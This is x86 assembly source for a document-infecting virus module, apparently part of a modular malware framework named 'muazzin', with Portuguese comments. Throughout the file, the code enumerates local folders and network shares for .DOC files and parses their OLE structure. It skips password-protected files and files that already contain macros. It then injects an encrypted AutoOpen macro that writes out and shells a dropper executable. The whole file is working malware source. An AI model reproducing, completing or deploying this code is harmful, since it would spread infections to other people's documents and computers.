BITS 32

%include "\muazzin\muazzin.asi"

;%define DEBUG 1

TYPE    EQU "idoc"
VERSION EQU 0001h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_QUERY
       jz .noquery
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       jmp near .skip1
  .noquery:
       test dword [esi+m_why], MT_APP
       jz near .skip2
       pushad
       call delta
       mov eax, [esi+m_dropper]
       mov [ebp+dropper], eax
       mov eax, [esi+m_droppersize]
       mov [ebp+droppersize], eax
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       test eax, eax
       jz .error
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       test eax, eax
       jz .error
       jmp short .next_import
  .dll_done:
       pop esi
       jmp short .next_dll
  .error:
       pop esi
       stc
       db 0b0h
  .all_import:
       clc
       jc .error2
       call [ebp+GetTickCount]
       mov [ebp+seed], eax
       lea eax, [ebp+check_doc]
       push eax
       call busca_recursiva
       lea eax, [ebp+file_handler2]
       push eax
       push byte 0
       call NetSearch
  .error2:
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp short .next_unload
  .all_unload:
       popad
  .skip2:
       mov dword [esi+m_result], MR_DONE
  .skip1:
       ret 4

%include "\muazzin\samples\search2.asi"

%include "\muazzin\samples\localnet.asi"

file_handler2:
       pushad
       call delta
       mov eax, [esp+8*4+4]
       push eax
       call [ebp+SetCurrentDirectoryA]
       test eax, eax
       jz .done
       lea eax, [ebp+check_doc]
       push eax
       call busca_disco                         ;busca dentro dos diretorios
  .done:
       popad
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

check_doc:
       pushad
       mov esi, [esp+(8*4)+4]
  .seek0end:
       lodsb
       test al, al
       jnz .seek0end
       mov eax, dword [esi-5]
       and eax, 0dfdfdfffh
       cmp eax, ".DOC"
       jne near .done
       call delta
%ifdef DEBUG
       pushad
       sub esp, 100h
       push byte 4
       call .zkips1
       db "Infectar este arquivo?", 0
  .zkips1:
       push dword [esp+(8*4)+4+(8*4)+100h+2*4]
       push byte 0
       call [ebp+MessageBoxA]
       cmp eax, 7
       je .done123
       mov edi, esp
       mov esi, [edi+(8*4)+4+(8*4)+100h]
       push byte 1
       push edi
       push esi
  .zopy:
       lodsb
       stosb
       test al, al
       jnz .zopy
       mov dword [edi-1], ".bak"
       mov byte [edi+3], 0
       call [ebp+CopyFileA]
       test eax, eax
  .done123:
       lea esp, [esp+100h]
       popad
       jz near .done
%endif
       push dword [esp+(8*4)+4]
       call infect_doc
  .done:
       popad
       ret 4

random:
       pushad
       mov eax, 12345678h
  seed equ $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       call delta
       mov [ebp+seed], eax
       mov ecx, [esp+(8*4)+4]
       jecxz .nolimit
       cdq
       div ecx
       xchg eax, edx
  .nolimit:
       mov [esp+(7*4)], eax
       popad
       ret 4

TEMPLATE_SIZE equ 32h

infect_doc:
       pushad
       call delta
       push byte 0
       call random
       mov byte [ebp+crypt_key], al
       shr eax, 8
       and eax, 0f0f0fh
       add eax, "aaa"
       mov byte [ebp+macro_var1a], al
       mov byte [ebp+macro_var1b], al
       shr eax, 8
       mov byte [ebp+macro_var2a], al
       mov byte [ebp+macro_var2b], al
       mov byte [ebp+macro_var2c], al
       mov byte [ebp+macro_var2d], al
       mov byte [ebp+macro_var2e], al
       mov byte [ebp+macro_var2f], al
       mov byte [ebp+macro_var2g], al
       shr eax, 8
       mov byte [ebp+macro_var3a], al
       mov byte [ebp+macro_var3b], al
       mov esi, 12345678h
  droppersize equ $-4
       lea eax, [esi*4]
       push eax
       push byte 40h
       call [ebp+GlobalAlloc]
       test eax, eax
       jz near .error
       mov [ebp+macrobuffa], eax
       xchg eax, edi
       mov ecx, 12345678h
  dropper equ $-4
       xchg ecx, esi
       push edi
       lea eax, [esi+ecx]
       mov [ebp+.limit], eax
       push ecx
       push esi
       lea esi, [ebp+macro_intro]
       push byte macro_intro_size
       pop ecx
       rep movsb
       pop esi
       pop ecx
  .encode:
       mov ebx, edi             ;ebx==onde por size
       stosb
       sub edx, edx
  .encode1:
       dec ecx
       jz .done_encode
       lodsb
       test al, al
       jz .zero
  .encode2:
       stosb
       inc edx
       cmp dx, 255
       jb .encode1
  .encode3:
       mov byte [ebx], dl
       mov ax, 6a07h
       stosw
       jmp short .encode
  .zero:
       push esi
       push eax
       sub ebp, ebp
  .add1:
       inc ebp
       lodsb
       cmp esi, 12345678h
  .limit equ $-4
       jae .done_count
       test al, al
       jz .add1
  .done_count:
       pop eax
       pop esi
       cmp ebp, 10
       jb .encode2
       push ebp
       call .string$
       sub ecx, ebp
       jbe .done_encode
       dec ebp
       add esi, ebp
       jmp short .encode3
  .done_encode:
       call delta
       mov byte [ebx], dl
       push esi
       lea esi, [ebp+macro_coda]
       push byte macro_coda_size
       pop ecx
       rep movsb
       pop esi
       mov eax, 01b1a64h
       stosd                    ;END SUB
       dec edi
       pop eax
       sub edi, eax     ;edi==macrosize
       mov [ebp+macrosize], edi
       add edi, TEMPLATE_SIZE
       mov [ebp+total_size], edi
       add edi, 1ffh
       and edi, -200h
       push edi
       mov [ebp+addsize], edi
       push byte READWRITE
       push dword [esp+8*4+2*4+4]
       call map
       jc near .error                ;erro no mapping...
       mov eax, [ebp+DTAbuffer+32]
       test eax, 1ffh
       jnz near .unmap_error         ;tamanho nao alinhado?
       cmp eax, 800000
       ja near .unmap_error          ;muito grande...
       mov [ebp+doc_filelen], eax
       mov esi, [ebp+handle3]
       mov edi, esi                     ;+++edi==mapbase
;!!!INIT OF DOC INFECTION
       cmp word [esi], 0cfd0h    ;d0cf->docfile
       jne near .unmap_error
       cmp word [esi+1eh], 9            ;setores de tamanho 512
       jne near .unmap_error
       cmp dword [esi+44h], byte -2   ;2§ FAT ptr unsupported
       jne near .unmap_error
       lea edx, [esi+4ch]       ;+++edx==fatdir
       imul eax, [esi+30h], 512
       lea esi, [esi+eax+512+80h]
       call .checksum
       add ebx, -("W"+"o"+"r"+"d"+"D"+"o"+"c"+"u"+"m"+"e"+"n"+"t")
       jz .valid
       add esi, byte 80h-12*2
       call .checksum
       xor ebx, "W"+"o"+"r"+"d"+"D"+"o"+"c"+"u"+"m"+"e"+"n"+"t"
  .valid:
       jnz near .unmap_error         ;worddoc stream encontrada?
       lea eax, [esi+78h-12*2]
       mov ecx, [eax]
       cmp ecx, 1000h   ;use mini-FAT?
       jb near .unmap_error
       mov [ebp+doc_ptr2size], eax
       mov [ebp+doc_len], ecx
       mov eax, [esi+74h-12*2]
       mov [ebp+doc_stream], eax   ;wordoc stream
       imul eax, eax, 512
       lea eax, [edi+eax+512]
       cmp word [eax], 0a5dch           ;assinatura da FIB nao bate
       jne near .unmap_error
       bt dword [eax+0ah], 8
       jc near .unmap_error          ;tem senha...
       bt dword [eax+13h], 0
       jc near .unmap_error          ;usado ultima vez num Mac
       bts dword [eax+0ah], 0
       jc near .unmap_error          ;ja tem macros...
       mov ecx, [ebp+total_size]
       add ecx, 1ffh
       shr ecx, 9
       mov eax, [ebp+doc_filelen]
       shr eax, 9
       dec eax
       mov esi, eax
       lea ebx, [eax+ecx]
       and ebx, byte -80h
       and esi, byte -80h
       sub esi, ebx
       jz .add_sector                   ;still inside
       shr ebx, 7-2
       mov [edx+ebx], eax
       inc eax
  .add_sector:
       mov [ebp+doc_connection], eax    ;first sector of virus macro
  .add_loop:
       call .docfat_convert
       inc eax
       mov [ebx+esi*4], eax             ;alloc sector
       loop .add_loop
       mov eax, 12345678h
  doc_stream equ $-4
       mov ecx, [ebp+doc_len]
       sub ecx, 512
  .find_next:
       call .docfat_convert
       mov eax, [ebx+esi*4]
       sub ecx, 512
       jnb .find_next
       call .docfat_convert
       mov dword [ebx+esi*4], 12345678h
  doc_connection equ $-4
       mov eax, 12345678h
  doc_len equ $-4
       add eax, 1ffh
       and eax, -200h
       imul ebx, [ebp+doc_stream], 512
       lea ebx, [edi+ebx+512]
       mov [ebx+118h], eax
       mov dword [ebx+11ch], TEMPLATE_SIZE
       lea ecx, [eax+TEMPLATE_SIZE]
       mov [ebp+macropos], ecx
       add eax, 12345678h
  total_size equ $-4
       mov [ebx+20h], eax
       mov [12345678h], eax
  doc_ptr2size equ $-4
;!!!END OF DOC INFECTION
       add edi, 12345678h
  doc_filelen equ $-4
       mov eax, 000101ffh
       stosd
       mov eax, 000010055h
  crypt_key equ $-3
       mov dl, ah
       stosd
       mov eax, 0ffff0000h
       stosd
       sub eax, eax
       stosd
       mov eax, 12345678h
  macrosize equ $-4
       stosd
       mov eax, 4
       stosd
       mov eax, 12345678h
  macropos equ $-4
       stosd
       mov eax, 0510h
       stosd
       mov eax, 01110001h
       stosd
       mov eax, 08000100h
       stosd
       mov eax, "AUTO"
       stosd
       mov eax, "OPEN"
       stosd
       mov ax, 4000h
       stosw
       mov esi, 12345678h
  macrobuffa equ $-4
       mov ecx, [ebp+macrosize]
       push esi
  .crypt_macro:
       lodsb
       xor al, dl
       stosb
       loop .crypt_macro
       call [ebp+GlobalFree]
       mov eax, 12345678h
  addsize equ $-4
       add [ebp+DTAbuffer+32], eax
  .unmap_error:
       call unmap
  .error:
       popad
       ret 4

  .checksum:
       push byte 12
       sub eax, eax
       sub ebx, ebx
       pop ecx
  .next:
       lodsw
       add ebx, eax
       loop .next
       ret

  .docfat_convert:
       mov esi, eax
       shr esi, 7
       mov ebx, [edx+esi*4]
       imul ebx, ebx, 512
       lea ebx, [edi+ebx+512]           ;ebx=FAT sector ptr
       mov esi, eax
       and esi, 7fh                     ;esi=FAT index
       ret

  .string$:
       mov eax, 800b6707h
       stosd
       mov eax, [esp+4]
       shl eax, 16
       mov ax, 6c05h
       stosd
       mov eax, 00006c12h
       stosd
       mov al, 6
       stosb
       ret 4

macro_intro equ $
       dw 1

       db 64h
       db 1bh
       db 69h
       db 04h
       dd "MAIN"                       ;SUB MAIN
       db 64h
       db 69h
       db 01
macro_var1a db 0
       db 0ch                        ;A=
       db 6ah
macro_intro_size equ $-macro_intro

macro_coda equ $
       db 64h                          ;B=
       db 69h
       db 1
macro_var2a db 0
       db 0Ch
       db 67h
       db 8ch
       db 81h
       db 5
       db 6Ch
       dw 11
       db 6
       db 7
       db 6Ah
       db 1
       db "\"

       db 64h                         ; for i=
       db 23h
       db 69h
       db 1
macro_var3a db 0
       db 0Ch
       db 6Ch
       dw 1
       db 24h
       db 6Ch                          ;to
       dw 8

       db 64h                         ; t$=t$+
       db 69h
       db 1
macro_var2b db 0
       db 0Ch
       db 69h
       db 1
macro_var2c db 0
       db 7
       db 67h
       db 5
       db 80h
       db 5
       db 67h
       db 2
       db 80h
       db 5
       db 67h
       db 0Eh
       db 80h
       db 5
       db 6
       db 0Ah
       db 6Ch
       dw 26
       db 7
       db 6Ch
       dw "A"
       db 6
       db 6

       db 64h                         ; next
       db 26h
       db 69h
       db 1
macro_var3b db 0

       db 64h                         ; t$=t$+
       db 69h
       db 1
macro_var2d db 0
       db 0Ch
       db 69h
       db 1
macro_var2e db 0
       db 7
       db 6Ah
       db 4
       db '.TMP'

       db 64h                         ; open t$
       db 3Dh
       db 69h
       db 1
macro_var2f db 0
       db 23h
       db 3Bh
       db 34h
       db 71h
       db 6Ch
       dw 1

       db 64h                        ; print
       db 36h
       db 71h
       db 6Ch
       dw 1
       db 12h
       db 69h
       db 01
macro_var1b db 0

       db 64h                        ; close
       db 4Ch
       db 71h
       db 6Ch
       dw 1

       db 64h                        ; shell
       db 67h
       db 2Dh
       db 80h
       db 69h
       db 1
macro_var2g db 0
       db 12h
       db 6Ch
       dw 4

macro_coda_size equ $-macro_coda

docinfect_size equ $-infect_doc

import_table dd kernel32
             dd mpr
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
;.api011     dd .apiname011
.api012     dd .apiname012
.api013     dd .apiname013
.api014     dd .apiname014
.api015     dd .apiname015
.api016     dd .apiname016
.api017     dd .apiname017
%ifdef DEBUG
.api018     dd .apiname018
%endif
.api019     dd .apiname019
.api020     dd .apiname020
.api021     dd .apiname021
.api022     dd .apiname022
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "GlobalAlloc", 0
.apiname006 db "GlobalFree", 0
.apiname007 db "GetTickCount", 0
.apiname008 db "CreateFileMappingA", 0
.apiname009 db "MapViewOfFile", 0
.apiname010 db "UnmapViewOfFile", 0
;.apiname011 db "GetSystemDirectoryA", 0
.apiname012 db "FindNextFileA", 0
.apiname013 db "SetCurrentDirectoryA", 0
.apiname014 db "FindFirstFileA", 0
.apiname015 db "FindClose", 0
.apiname016 db "SetFileAttributesA", 0
.apiname017 db "SetFileTime", 0
%ifdef DEBUG
.apiname018 db "CopyFileA", 0
%endif
.apiname019 db "GetDriveTypeA", 0
.apiname020 db "SetFilePointer", 0
.apiname021 db "SetEndOfFile", 0
.apiname022 db "Sleep", 0

LoadLibraryA         equ kernel32.api001
FreeLibrary          equ kernel32.api002
CreateFileA          equ kernel32.api003
CloseHandle          equ kernel32.api004
GlobalAlloc          equ kernel32.api005
GlobalFree           equ kernel32.api006
GetTickCount         equ kernel32.api007
CreateFileMappingA   equ kernel32.api008
MapViewOfFile        equ kernel32.api009
UnmapViewOfFile      equ kernel32.api010
;GetSystemDirectoryA equ kernel32.api011
FindNextFileA        equ kernel32.api012
SetCurrentDirectoryA equ kernel32.api013
FindFirstFileA       equ kernel32.api014
FindClose            equ kernel32.api015
SetFileAttributesA   equ kernel32.api016
SetFileTime          equ kernel32.api017
%ifdef DEBUG
CopyFileA            equ kernel32.api018
%endif
GetDriveTypeA        equ kernel32.api019
SetFilePointer       equ kernel32.api020
SetEndOfFile         equ kernel32.api021
Sleep                equ kernel32.api022

%ifdef DEBUG
user32      db "USER32.DLL", 0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0
MessageBoxA equ user32.api001
%endif

mpr         db "MPR.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname002
            dd 0
.apiname001 db "WNetOpenEnumA", 0
.apiname002 db "WNetEnumResourceA", 0
.apiname003 db "WNetCloseEnum", 0

WNetOpenEnumA     equ mpr.api001
WNetEnumResourceA equ mpr.api002
WNetCloseEnum     equ mpr.api003

%define CUT_EXTRA 1

%include "\muazzin\samples\maplib.asi"

getpaddr    dd 0
getmhnd     dd 0

